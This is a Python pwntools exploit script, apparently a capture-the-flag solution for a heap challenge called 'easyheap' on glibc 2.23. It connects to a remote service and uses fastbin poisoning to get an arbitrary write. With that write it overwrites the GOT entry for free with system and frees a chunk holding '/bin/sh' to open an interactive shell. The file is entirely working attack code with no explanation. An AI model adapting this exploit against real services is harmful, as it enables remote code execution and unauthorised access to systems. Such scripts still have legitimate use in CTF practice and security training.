from pwn import *
from LibcSearcher import *
from utils import log
from loader import Loader
from pwnlib.util.proc import wait_for_debugger

loader = Loader("target/easyheap", 64)
loader.debug()


@log
def ru(x): return io.recvuntil(x)
@log
def rl(): return io.recvline()
@log
def sla(x, y): return io.sendlineafter(x, y)
@log
def sl(x): return io.sendline(x)
@log
def s(x): return io.send(x)
@log
def sa(x, y): return io.sendafter(x, y)
def psize(x): return loader.psize(x)
def shell(): io.interactive()
def bt(s): return bytes(str(s),encoding='utf-8')
# io = process(loader.root,stdin=PTY)
# wait_for_debugger(io.pid)


pwnfile = [
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so',
    '--library-path',
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64',
    'target/easyheap'
]
# io = process(pwnfile)
io = loader.remote(29613)
elf = loader.elf


def main():
    def create(size, content):
        sla(b'choice :', b'1')
        sla(b"Size of Heap : ", bt(size))
        sla(b"Content of heap:", content)

    def edit(index, size, content):
        sla(b'choice :', b'2')
        sla(b"Index :", bt(index))
        sla(b"Size of Heap : ", bt(size))
        sla(b"Content of heap : ", content)

    def delete(index):
        sla(b'choice :', b'3')
        sla(b"Index :", bt(index))

    fd = 0x06020AD
    create(0x68, 'aaaa')
    create(0x68, 'bbbb')
    create(0x68, 'cccc')
    
    delete(2)
    payload = b'/bin/sh\x00' + 0x60*b'a' + p64(0x71) + p64(fd)
    edit(1, len(payload), payload)
    create(0x68, 'dddd') # 2
    create(0x68, 'eeee') # 3
    payload = b'\x00'*3+0x20*b'a'+p64(elf.got['free'])
    edit(3, len(payload), payload)
    edit(0, 8, p64(elf.plt['system']))
    delete(1)
    # sla(b"choice :",b'4869')
    shell()


if __name__ == "__main__":
    main()